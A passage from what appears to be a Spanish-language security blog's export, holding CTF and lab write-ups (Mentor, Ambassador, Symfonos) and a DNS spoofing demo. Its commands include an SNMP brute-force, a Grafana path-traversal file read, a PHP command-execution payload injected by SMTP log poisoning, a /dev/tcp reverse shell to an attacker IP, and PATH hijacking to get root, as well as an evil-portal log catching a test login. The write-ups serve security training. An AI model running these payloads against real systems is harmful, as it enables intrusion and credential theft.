addresses\n127.0.0.1  localhost\n127.0.1.1  parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n# Others\n10.10.11.193   mentorquotes.htb\n```\nAbrimos Firefox, y accedemos a la url:\n\n![mentorquotes.htb](/static/images/uploads/ctf-mentor/image-6.webp)\n\nEn esta página no hay mucho que ver. Con *whatweb* extraemos la siguiente información:\n\n\n```\n whatweb mentorquotes.htb\nhttp://mentorquotes.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.10.11.193], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]\n```\n*Werkzeug*, es una librería muy común de Frameworks de *Python* como *Flask* y *Django*. Una primera aproximación es ver si está el modo *debug* activo accediendo a la URL */console* como explican [aquí](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug). No tenemos tanta suerte por el momento, a sí que lo próximo es aplicar fuzzing en busca de subdominios desconocidos.\n\n## Enumeración Web\n\n\n```\n wfuzz -c --hc=302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.mentorquotes.htb\" mentorquotes.htb\n\n# Output\n===============================================================\nID           Response   Lines    Word       Chars       Payload\n===============================================================\n000000051:   404        0 L      2 W        22 Ch       \"api\"\n```\n**Importante destacar que en la llamada, NO estamos ocultando las peticiones 404 con el parametro *--hc*. Esto es porque los subdominios que no existen, en este caso, se redirigen siempre devolviendo un estado 302.**\n\nEl resultado del fuzzing es que parece existir un subdominio *http://api.mentorquotes.htb*. Lo añadimos a nuestro */etc/hosts.*\n\n\n```\n# /etc/hosts\n# Host addresses\n127.0.0.1  localhost\n127.0.1.1  parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n# Others\n10.10.11.193   mentorquotes.htb     api.mentorquotes.htb\n```\nAplicando un CURL, vemos lo siguiente:\n\n\n```\n curl -I api.mentorquotes.htb\nHTTP/1.1 404 Not Found\nDate: Fri, 30 Dec 2022 19:05:13 GMT\nServer: uvicorn\ncontent-length: 22\ncontent-type: application/json\n```\nEn este caso, es el propio servidor *Uvicorn* el que está contestándonos. Parece ser que Apache está actuando de *Reverse Proxy* cuando accedemos a ciertos dominios/subdominios.\n\n![Server schema](/static/images/uploads/ctf-mentor/Untitled-2022-12-30-2011.svg)\n\nRepetimos el fuzzing contra el subdominio que acabamos de encontrar, a ver si hay alguna ruta oculta.\n\n\n```\n wfuzz -c --hc=404,302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: api.mentorquotes.htb\" mentorquotes.htb/FUZZ\n\n# Output\n================================================================\nID           Response   Lines    Word       Chars       Payload\n================================================================\n000000150:   200        30 L     62 W       969 Ch      \"docs\" \n000000024:   307        0 L      0 W        0 Ch        \"admin\" \n000000646:   307        0 L      0 W        0 Ch        \"users\"\n000002314:   307        0 L      0 W        0 Ch        \"quotes\"\n```\nParece ser que estamos ante una API con Swagger.\n\n![](/static/images/uploads/ctf-mentor/image-7.webp)\n\nAdemás, encontramos a un usuario *james@mentorquotes.htb*. Podemos llegar a registrar un usuario, pero no podemos continuar por este camino.\n\nVamos a ver si *SNMP* está funcionando en el servidor. Utilizaremos de nuevo *nmap* con permisos de *sudo* para poder utilizar el descubrimiento de puertos *UDP*.\n\n\n```\n sudo nmap -p161 -sU 10.10.11.193\nPORT    STATE SERVICE\n161/udp open  snmp\n```\n## Abusando de SNMP\n\nSNMP puede funcionar bajo diferentes versiones. Utilizamos una herramienta de fuerza bruta para enumerar que versiones están disponibles en el servidor, así como las *community string* que utilizan.\n\n\n```\n python snmpbrute.py -t 10.10.11.193\n   _____ _   ____  _______     ____             __     \n  / ___// | / /  |/  / __ \\   / __ )_______  __/ /____ \n  \\__ \\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\\n ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/\n/____/_/ |_/_/  /_/_/      /_____/_/   \\__,_/\\__/\\___/ \n\nSNMP Bruteforce & Enumeration Script v2.0\nhttp://www.secforce.com / nikos.vassakis  secforce.com\n###############################################################\n10.10.11.193 : 161 Version (v2c): internal\n10.10.11.193 : 161 Version (v1): public\n10.10.11.193 : 161 Version (v2c): public\n10.10.11.193 : 161 Version (v1): public\n10.10.11.193 : 161 Version (v2c): public\n```\nLa *community string public* suele ser la que viene por defecto. Parece sospechosa la *internal* que funciona bajo la versión *v2c*. Vamos a tirar por ahí.\n\nLanzamos el comando *snmpwalk* durante unos minutos y almacenamos la salida del comando en un archivo para poderlo consultar posteriormente.\n\n\n```\n snmpwalk -v2c -c internal 10.10.11.193 | tee snmpwalk.log\n```\nEl parámetro *-c* es para establecer la cadena de comunidad con la que queremos escuchar. Normalmente, el valor es *public, pero* en este caso, con *public* no obtenemos ninguna información valiosa.\n\nCerca del final, encontramos la siguiente línea:\n\n\n```\niso.3.6.1.2.1.25.4.2.1.5.2126 = STRING: \"/usr/local/bin/login.py kj2xxxxxxxxxxxxxx\"\n```\nCon ayuda de Swagger o directamente, con CURL, utilizamos esa contraseña que empieza por kj2... en uno de los endpoints de la API.\n\n\n```\ncurl -X 'POST' \\\n  'http://api.mentorquotes.htb/auth/login' \\\n  -H 'accept: application/json' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n  \"email\": \"james@mentorquotes.htb\",\n  \"username\": \"james\",\n  \"password\": \"kj23sadkj123as0-d213\"\n}'\n\n# Output\n\"eyJxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"%\n```\n## Explotación\n\nArrancamos *Burpsuite* e interceptamos una petición hacia *http://api.mentorquotes.htb/admin*. Debemos incrustar el parámetro *Authorization* junto con el *Token* recogido en la petición anterior.\n\n![Captura de Burpsuite/Repeater](/static/images/uploads/ctf-mentor/image-8.webp)\n\nVemos que existen dos nuevos *endpoints*. */check* y */backup*. Parece que el primero no funciona, y el segundo, solo funciona si la petición es de tipo POST. Además, el parámetro *Content-Type* debe ser *application/json* y espera recibir un diccionario del siguiente tipo: *{\"body\": \"xxx\", \"path\": \"xxx\"}.*\n\n![Captura de Burpsuite/Repeater](/static/images/uploads/ctf-mentor/image-9.webp)\n\nSegún parece, el valor que dejas en el parámetro path es vulnerable a *RCE*. Escuchamos en el puerto 1234 con *Netcat* y entablamos una reverse *shell*. Por un lado, tenemos lo siguiente:\n\n![Captura de Burpsuite con la Reverse Shell](/static/images/uploads/ctf-mentor/image-10.webp)\n\nY por el otro, entablamos la *shell*:\n\n\n```\n sudo nc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.14.88] from (UNKNOWN) [10.10.11.193] 34881\nsh: can't access tty; job control turned off\n/app # whoami\nroot\n/app # cat /home/svc/user.txt\n3eaXXXXXXXXXXXXXXXXXXXXXXXX\n```\nPrimera flag capturada. Tiene pinta que estamos dentro de un contenedor y que la próxima flag está fuera de él. Continuamos.\n\nInvestigando un poco los archivos, encontramos la siguiente información dentro un archivo */app/app/db.py:*\n\n\n```\nDATABASE_URL = os.getenv(\"DATABASE_URL\", \"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\")\n```\nAnotamos la información. Parece ser que hay una base de datos en el host, solamente accesible desde el contenedor.\n\n![Pivoting example](/static/images/uploads/ctf-mentor/Untitled-2022-12-30-2011-1.svg)\n\nCon ayuda de [*Chisel*](https://github.com/jpillora/chisel), ejecutamos en nuestra máquina el siguiente comando:\n\n\n```\n chisel server -p 1234 --reverse\n2022/12/30 23:13:54 server: Reverse tunnelling enabled\n2022/12/30 23:13:54 server: Fingerprint Y7dAMONRX/NODc3O0jqzg1tBqi8OKrLrLIItmMkAJoc=\n2022/12/30 23:13:54 server: Listening on http://0.0.0.0:1234\n```\nY en la máquina objetivo:\n\n\n```\n chisel client 10.10.14.88:1234 R:5431:172.22.0.1:5432\n2022/12/30 22:16:41 client: Connecting to ws://10.10.14.88:1234\n2022/12/30 22:16:41 client: Connected (Latency 104.066799ms)\n\n```\nUna vez establecida la conexión, desde nuestra máquina podemos lanzar los comandos necesarios para interactuar con la base de datos de Postgresql.\n\n\n```\n psql -h localhost -d mentorquotes_db -U postgres -p 5431\nmentorquotes_db=# \\dt\n          List of relations\n Schema |   Name   | Type  |  Owner   \n--------+----------+-------+----------\n public | cmd_exec | table | postgres\n public | quotes   | table | postgres\n public | users    | table | postgres\n(3 rows)\n\nmentorquotes_db=# select * from users;\n id |         email          |  username   |             password             \n----+------------------------+-------------+----------------------------------\n  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503\n  2 | svc@mentorquotes.htb   | service_acc | 53fxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n(3 rows)\n```\nEn https://crackstation.net/ podemos crackear el hash del password correspondiente al usuario service\\_acc.\n\nNos conectamos por *ssh* a la máquina, esta vez ya sí directamente al host, y continuamos con el escalado de privilegios.\n\n\n```\n sshpass -p 123meunomeeivani ssh svc@10.10.11.193\nsvc@mentor:~$ whoami\nsvc\nsvc@mentor:~$ id\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\n```\n## Escalada de privilegios\n\nRetomando SNMP, vemos su archivo de configuración en /etc/snmp/snmpd.conf\n\n\n```\n cat /etc/snmp/snmpd.conf\n...\ncreateUser bootstrap MD5 SuperSecurePassword123__ DES\n...\n```\nProbamos a logearnos al usuario james con esa contraseña.\n\n\n```\n su - james\nPassword: \njames@mentor:~$ whoami\njames\n```\nPero seguimos sin ser root.\n\nVemos qué permisos de sudo tenemos\n\n\n```\n sudo -l\n[sudo] password for james: \nMatching Defaults entries for james on mentor:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser james may run the following commands on mentor:\n    (ALL) /bin/sh\n```\nEs decir, podemos ejecutar */bin/sh* como sudo.\n\n\n```\n james@mentor:~$ sudo /bin/sh\n# whoami\nroot\n# cat /root/root.txt\ne01xxxxxxxxxxxxxxxxx\n\n```\n"
    },
    {
        "title": "CTF - Ambassador WriteUp",
        "slug": "ctf-ambassador-writeup",
        "date": "2023-01-01",
        "tags": [
            "Grafana",
            "Git",
            "Rce",
            "Lfi",
            "CTF",
            "Directory Path Traversal"
        ],
        "images": [
            "/static/images/uploads/ctf-ambassador-writeup/Ambassador.webp",
            "/static/images/uploads/ctf-ambassador-writeup/image.webp",
            "/static/images/uploads/ctf-ambassador-writeup/image-1.webp"
        ],
        "draft": true,
        "summary": "Reto CTF que consiste en enumerar y explotar una máquina. Se atacan vulnerabilidades como Local File Inclusion (LFI) en Grafana y obtención de credenciales en archivos de configuración y base de datos.",
        "content": "![](/static/images/uploads/ctf-ambassador-writeup/Ambassador.webp)\n\nEsta máquina ha sido una que me ha gustado mucho. Sobre todo la primera parte hasta llegar a la escalada de privilegios.\n\n## Enumeración\n\n\n```\n nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.183\n\n# Output\n[*] Open ports: 22,80,3000,3306\n```\nSi analizamos concretamente los puertos expuestos, nos encontramos con la siguiente información.\n\n\n```\n nmap -p22,80,3000,3306 -vvv -sCV 10.10.11.183 -oN targeted\n\n# Output\nPORT     STATE SERVICE REASON  VERSION\n22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)\n80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Hugo 0.94.2\n| http-methods: \n|_  Supported Methods: POST OPTIONS HEAD GET\n|_http-title: Ambassador Development Server\n3000/tcp open  ppp?    syn-ack\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 302 Found\n|     Cache-Control: no-cache\n|     Content-Type: text/html; charset=utf-8\n|     Expires: -1\n|     Location: /login\n|     Pragma: no-cache\n|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax\n|     X-Content-Type-Options: nosniff\n|     X-Frame-Options: deny\n|     X-Xss-Protection: 1; mode=block\n|     Date: Sun, 01 Jan 2023 19:33:04 GMT\n|     Content-Length: 29\n|     href=\"/login\"Found.\n3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.30-0ubuntu0.20.04.2\n|   Thread ID: 15\n|   Capabilities flags: 65535\n\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n```\nTenemos el puerto de *SSH*, lo que parece un s*ervidor web* típico en el puerto 80, algo desconocido en el puerto 3000 y una base de datos *MySQL* en el puerto 3306.\n\n## Local File Inclusion\n\nComo me corroe la curiosidad, empiezo por el puerto 3000 y me encuentro Grafana instalado.\n\n![](/static/images/uploads/ctf-ambassador-writeup/image.webp)\n\nUna búsqueda rápida en searchsploit me devuelve una vulnerabilidad para las versiones de Grafana anteriores a la versión 8.3.\n\n\n```\n searchsploit grafana 8.3\n---------------------------------------------------------------------------\n Exploit Title                                               |  Path\n---------------------------------------------------------------------------\nGrafana 8.3.0 - Directory Traversal and Arbitrary File Read  |    multiple/webapps/50581.py\n---------------------------------------------------------------------------\n```\nExaminando un poco el exploit, vemos que podemos provocar un LFI con un simple comando de CURL.\n\n\n```\n curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/passwd\n\n# Output\nroot:x:0:0:root:/root:/bin/bash\n...\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\n...\ngrafana:x:113:118::/usr/share/grafana:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\nconsul:x:997:997::/home/consul:/bin/false\n```\nBuscando un poco por archivos que pueden resultarnos de interés en este caso, examinamos el archivo de configuración de Grafana almacenado en */etc/grafana/grafana.ini*.\n\n\n```\n curl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../etc/grafana/grafana.ini\n\n# Output\n...\n# default admin user, created on startup\n;admin_user = admin\n\n# default admin password, can be changed before first start of grafana,  or in profile settings\nadmin_password = messageInABottle685427\n...\n```\nCon esas credenciales, podemos entrar directamente al panel de Grafana. En él, vemos que hay una base de datos MySQL configurada, pero no podemos ver sus credenciales. Además de eso, no hay mucho más que podamos hacer por esa vía. Otra ruta de interés es */var/lib/grafana/grafana.db.*\n\n![Mysql configurado en Grafana](/static/images/uploads/ctf-ambassador-writeup/image-1.webp)\n\nEsta ruta contiene una base de datos *sqlite,* donde se almacenan los Dashboards configurados. Con el siguiente comando nos descargamos la base de datos.\n\n\n```\ncurl --path-as-is http://10.10.11.183:3000/public/plugins/logs/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n100  644k  100  644k    0     0   529k      0  0:00:01  0:00:01 --:--:--  529k\n```\nY empezamos a mirar cosas:\n\n\n```\n sqlite3 grafana.db\nsqlite .tables\n...          \ndata_source                 test_data                 \n...\nsqlite select * from data_source;\n2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-01 19:26:31|0|{}|1|uKewFgM4z\n```\nLlegado a este punto, probamos a \n\n"
    },
    {
        "title": "DNS Spoofing - POC",
        "slug": "wifi-pineapple-mkvii",
        "date": "2023-01-03",
        "tags": [
            "DNS Spoofing",
            "POC"
        ],
        "images": [
            "/static/images/uploads/wifi-pineapple-mkvii/life-of-a-dns-query.webp",
            "/static/images/uploads/wifi-pineapple-mkvii/iphone14_spoof.webp"
        ],
        "draft": true,
        "summary": "Reto CTF que consiste en explicar cómo funciona el WiFi Pineapple Mk7 y su capacidad para realizar ataques de DNS spoofing. Se explora la modificación del archivo /etc/hosts y el cache DNS en un teléfono móvil.",
        "content": "Hace poco me compré el WiFi Pineapple Mk7 de Hack5. Y voy a explicar como funciona los dns utilizando ilustraciones de *[Julia Evans (@b0rk)](https://wizardzines.com/)*\n\n![](/static/images/uploads/wifi-pineapple-mkvii/life-of-a-dns-query.webp)\n\nUpdate /etc/hosts\n\n⚠️ey!\n```\n# File: /etc/hosts\n# \n#  \n192.168.0.10 doogle.es\n```\nClear DNS cache\n\n\n```\n# killall dnsmasq && /etc/init.d/dnsmasq start\n```\nVamos al movil\n\n![DNS Spoofing gmail.google.es](/static/images/uploads/wifi-pineapple-mkvii/iphone14\\_spoof.webp)\n\ny ahora de nuevo\n\n\n```\nevil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:05 +0000] \"GET /assets/css/custom.css HTTP/1.1\" 200 1263 \"http://gmail.google.es/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\"\n\nevil-portals  | 172.18.0.1 - - [04/Jan/2023:19:40:53 +0000] \"GET /controller.php?email=Iker%40prueba.es&password=TeNmUcHoCuIdAdO&hostname=&mac=&ip=172.18.0.1&target=http%3A%2F%2Fgmail.google.es%2F HTTP/1.1\" 302 266 \"http://gmail.google.es/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\"\n```\n"
    },
    {
        "title": "Symfony 1 y 2",
        "slug": "symfony-1-y-2",
        "date": "2023-01-13",
        "tags": [],
        "images": [],
        "draft": true,
        "summary": "Reto CTF de Capture The Flag: Consiste en buscar una máquina utilizando arp-scan y descubrir que pertenece a VBOX usando macchanger. Se explora vulnerabilidad en ARP y en la dirección MAC.",
        "content": "Con arp-scan buscamos la maquina\n\ncon macchanger -l | grep 08:00:27 vemos que es de VBOX\n\n"
    },
    {
        "title": "Symfonos 1 y 2 - Write Up",
        "slug": "symfonos-1-y-2-write-up",
        "date": "2023-01-15",
        "tags": [],
        "images": [
            "/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-1.webp",
            "/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Network.svg",
            "/static/images/uploads/symfonos-1-y-2-write-up/Helios-Wordpress.webp",
            "/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Proxychains.svg",
            "/static/images/uploads/symfonos-1-y-2-write-up/LibreNMS.webp",
            "/static/images/uploads/symfonos-1-y-2-write-up/LibreNMS-Logged.webp"
        ],
        "draft": false,
        "summary": "La máquina Symfonos 1 es un reto CTF que consiste en aprovechar diversas vulnerabilidades como **smbmap**, **Path Hijacking**, **Log Poisoning**, y una vulnerabilidad de **FTP** y **LibreNMS** para lograr obtener acceso a la máquina y escalar privilegios.",
        "content": "![](/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-1.webp)\n\nMáquinas **easy** y **medium**, donde aprovechamos la técnica del **pivoting** para saltar entre ellas y llegar a la prueba final. Enumeramos mucho, nos aprovechamos de **smbmap**, un plugin de mail de Wordpress, **Log Poisoning**, **Path Hijacking**, vulnerabilidad de **FTP**, **BruteForce** del archivo shadow, LibreNMS vulnerable y posibilidad de ejecutar MySQL como sudo.\n\n![](/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Network.svg)\n\n# Symfonos 1\n\n## Primeros pasos\n\nEn este caso, desconocemos la IP de la máquina. Lo primero que vamos a hacer es recoger los host visibles desde mi equipo cacheados en la tabla ARP. Una alternativa sería utilizar **ArpScan**.\n\n\n```\ncat /proc/net/arp\n# IP address       HW type     Flags       HW address            Mask     Device\n# 192.168.1.140    0x1         0x2         08:00:27:5a:60:b1     *        enp0s3\n# 192.168.1.137    0x1         0x0         00:00:00:00:00:00     *        enp0s3\n\n```\nLa IP 192.168.1.140 es nuestro objetivo ahora.\n\nCon un ping, obtenemos el TTL para saber si se refiere a una máquina Linux o una Windows.\n\n\n```\nping -c 1 192.168.1.140 -R\n# PING 192.168.1.140 (192.168.1.140) 56(124) bytes of data.\n# 64 bytes from 192.168.1.140: icmp_seq=1 ttl=64 time=0.420 ms\n# RR: \t192.168.1.138\n# \t    192.168.1.140\n# \t    192.168.1.140\n#\t    192.168.1.138\n\n```\n⚠️TTL~64 - Linux## Reconocimiento\n\nMediante **nmap** escaneamos los puertos abiertos.\n\n\n```\nnmap -p- -sS -vvv --open -n -Pn --min-rate 5000 192.168.1.140 -oG allPorts\n# Open ports: 22,25,80,139,445\n\n```\nAfinamos la búsqueda una vez conocidos los puertos abiertos.\n\n\n```\nnmap -p22,25,80,139,445 -sCV 192.168.1.140 -oN targeted\n\n```\nY vemos el archivo targeted para mirar un poco el resultado.\n\n\n```\n# Nmap 7.92 scan initiated Sat Jan 14 11:57:45 2023 as: nmap -p22,25,80,139,445 -sCV -oN targeted 192.168.1.140\nNmap scan report for symfonos.local (192.168.1.140)\nHost is up (0.00047s latency).\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n...\n25/tcp  open  smtp        Postfix smtpd\n...\n80/tcp  open  http        Apache httpd 2.4.25 ((Debian))\n...\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)\nMAC Address: 08:00:27:5A:60:B1 (Oracle VirtualBox virtual NIC)\n...\n\n```\nHe omitido el output para quedarme con lo interesante. Servicios de **ssh**, **smtp**, **http** y **smb** expuestos.\n\nMediante **smbmap**, intentamos obtener acceso a los recursos compartidos a ver si está todo bien configurado.\n\n\n```\nsmbmap -H 192.168.1.140\n# [+] Guest session   \tIP: 192.168.1.140:445\tName: symfonos.local                                    \n#         Disk                                           \tPermissions\tComment\n#         ----                                             \t-----------\t-------\n# \t\tprint$                                            \tNO ACCESS\tPrinter Drivers\n# \t\thelios                                            \tNO ACCESS\tHelios personal share\n#    \tanonymous                                         \tREAD ONLY\t\n#     \tIPC$                                              \tNO ACCESS\tIPC Service\nsmbmap -H 192.168.1.140 -r anonymous\n# [+] Guest session   \tIP: 192.168.1.140:445\tName: symfonos.local                                    \n#\tanonymous                                         \tREAD ONLY\t\n#\t.\\anonymous\\*\n#\tdr--r--r--                0 Sat Jun 29 03:14:49 2019\t.\n#\tdr--r--r--                0 Sat Jun 29 03:12:15 2019\t..\n#\tfr--r--r--              154 Sat Jun 29 03:14:49 2019\tattention.txt\nsmbmap -H 192.168.1.140 --download anonymous/attention.txt\n# [+] Starting download: anonymous\\attention.txt (154 bytes)\n# [+] File output to: /home/iocio/Desktop/VulnHub/Symfonos1/content/192.168.1.140-anonymous_attention.txt\n\n```\nSi cateamos el archivo de texto obtenemos lo siguiente.\n\n\n```\nCan users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! \n\nNext person I find using one of these passwords will be fired!\n\n-Zeus\n\n```\nCosas interesantes hasta aquí, de atrás adelante.\n\n* Las contraseñas 'epidioko', 'qwerty' y 'baseball' son contraseñas que debería tener en cuenta para continuar con el reto.\n* Por otro lado, hay un recurso compartido llamado 'helios' - 'Helios personal', que me puede hacer pensar que hay un usuario llamado helios.  \nVamos a intentar loguearnos a **smb** con el usuario 'helios' y cualquiera de esas 3 contraseñas.\n\n\n```\nsmbmap -H 192.168.1.140 -u helios -p qwerty\n# [+] IP: 192.168.1.140:445\tName: symfonos.local                                    \n#        Disk                                                  \tPermissions\tComment\n#     \t----                                                  \t-----------\t-------\n#   \tprint$                                            \tREAD ONLY\tPrinter Drivers\n#   \thelios                                            \tREAD ONLY\tHelios personal #   \tanonymous                                         \tREAD ONLY\t\n#   \tIPC$                                              \tNO ACCESS\tIPC Service\n\n```\nTirando del hilo como anteriormente, he encontrado dos archivos. Un research.txt y un todo.txt.  \nEl texto de todo.txt es el siguiente.\n\n\n```\n1. Binge watch Dexter\n2. Dance\n3. Work on /h3l105\n\n```\nEl tercer punto parece un directorio o una ruta. Si accedo por Firefox a la web expuesta y pongo esa ruta, vemos un servidor Wordpress. Coloco la siguiente entrada en `/etc/hosts` para que los archivos estáticos se descarguen correctamente y poderlo visualizar correctamente.\n\n\n```\n192.168.1.140    symfonos.local\n\n```\n![](/static/images/uploads/symfonos-1-y-2-write-up/Helios-Wordpress.webp)\n\nA partir de aquí podríamos utilizar **WpScan**, pero vamos a intentar enumerar posibles plugins que pueda tener instalados y buscar vulnerabilidades en ellos.\n\nCon la salida de curl, concatenando varios greps y algunos delimitadores, obtenemos la siguiente entrada:\n\n\n```\ncurl -X get 192.168.1.140/h3l105/ | grep 'wp-content' | grep -oP \"'.*?'\" | grep symfonos.local | cut -d '/' -f 1-7 | sort -u | grep plugins\n# 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta\n# 'http://symfonos.local/h3l105/wp-content/plugins/site-editor\n\n```\nHay un plugin de mails y otro bastante común para la edición del sitio. Recordamos que la máquina tiene expuesto el puerto de 25 SMTP. Vamos a ir por ese camino.\n\nBuscamos vulnerabilidades en **searchsploit**.\n\n\n```\nsearchsploit mail masta\n# WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                  | php/webapps/50226.py\n\n```\nEl plugin Mail Masta tiene una vulnerabilidad de tipo LFI.  \nMirando el script, vemos que la vulnerabilidad se encuentra en una URL. Vamos a probarlo manualmente con curl.\n\n\n```\ncurl -X GET \"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd\"\n# root:x:0:0:root:/root:/bin/bash\n# helios:x:1000:1000:,,,:/home/helios:/bin/bash \n\n```\nPodemos desarrollar un script para hacer más sencillas las consultas como [[lfi\\_read\\_file.sh]]  \nUn directorio interesante continuando con el tema de **smtp**, es `/var/mail/`.  \nCon ayuda del script, vemos dicho archivo.\n\n\n```\n./lfi_read_file.sh -f /var/mail/helios\n\n```\n## Log Poisoning de SMTP\n\nEl directorio */var/mail/helios* está expuesto. Si fuésemos capaces de enviar un mail y colar código PHP en él, podríamos mediante el **LFI** transformarlo en un **RCE** fácilmente.\n\nVamos a conectarnos por telnet al puerto del mail y tratar de enviar algo.\n\n\n```\ntelnet 192.168.1.140 25\n# Connected to 192.168.1.140.\n# Escape character is '^]'.\n# 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)\nMAIL FROM: 0x10\n# 250 2.1.0 Ok\nRCPT TO: helios\n# 250 2.1.5 Ok\nDATA\n# 354 End data with .\nphp system($\\_GET['cmd']) ?\n.\n# 250 2.0.0 Ok: queued as 9ACCB4083E\nquit\n\n```\nDe este modo, vamos a entablarnos una reverse shell.\n\n\n```\n# attacker\nsudo nc -lvnp 443\nlistening on [any] 443 ...\n\n```\n\n```\n# vulnerable machine\ncurl -vs -X GET \"http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=%2Fbin%2Fbash+-c+%22sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.138%2F443+0%3E%261%22\"\n\n```\n\n```\n# attacker\n# sudo nc -lvnp 443\n# listening on [any] 443 ...\nconnect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54028\nsh: 0: can't access tty; job control turned off\n$ whoami\nhelios\n\n```\n## Symfonos 1: Escalado\n\nBuscamos archivos SUID que permitan ejecutar código con permisos root.\n\n\n```\nfind \\-perm -4000 2/dev/null\n# ./usr/lib/eject/dmcrypt-get-device\n# ./usr/lib/dbus-1.0/dbus-daemon-launch-helper\n# ./usr/lib/openssh/ssh-keysign\n# ./usr/bin/passwd\n# ./usr/bin/gpasswd\n# ./usr/bin/newgrp\n# ./usr/bin/chsh\n# ./usr/bin/chfn\n# ./opt/statuscheck\n# ./bin/mount\n# ./bin/umount\n# ./bin/bash\n# ./bin/su\n# ./bin/ping\n\n```\nLlama la atención el archivo */opt/statuscheck*. Vamos a inspeccionarlo más\n\n\n```\nstrings /opt/statuscheck\n# ...\n# _ITM_registerTMCloneTable\n# GLIBC_2.2.5\n# curl -I H\n# http://lH\n# ocalhostH\n# AWAVA\n# AUATL\n# ...\n\n```\nHace uso del comando curl de forma relativa. Vamos a aplicar **Path Hijacking**.\n\n## Path Hijacking\n\nCreamos un archivo en la carpeta `/tmp` llamado curl, hacemos que ejecute el siguiente comando para darle privilegios **SUID** a */bin/bash*.\n\n\n```\nchmod u+s /bin/bash\n\n```\nAñadimos `/tmp` dentro de la variable *$PATH* asignándole prioridad.\n\n\n```\nexport PATH=/tmp:$PATH\n\n```\nY ejecutamos el archivo *statuscheck*. Posteriormente, llamamos a */bin/bash* con *-p* para lanzarlo con modo privilegiado.\n\n\n```\nsudo /opt/statuscheck\n/bin/bash -p\nwhoami\n# root\n\n```\nVamos a enumerar las interfaces que tiene activas.\n\n\n```\nhostname -I\n10.10.10.4 192.168.1.140\n\n```\nLa interfaz 10.10.10.4 era desconocida hasta ahora. Vamos a mirar su tabla **ARP**.\n\n\n```\ncat /proc/net/arp\nash-4.4# cat /proc/net/arp\nIP address       HW type     Flags       HW address            Mask     Device\n10.10.10.3       0x1         0x2         08:00:27:44:fe:76     *        enp0s8\n192.168.1.138    0x1         0x2         08:00:27:40:1b:d1     *        enp0s17\n192.168.1.1      0x1         0x2         b0:8b:92:fa:45:dc     *        enp0s17\n192.168.1.136    0x1         0x2         68:b6:91:4e:42:0c     *        enp0s17\n\n```\nAhí está el host 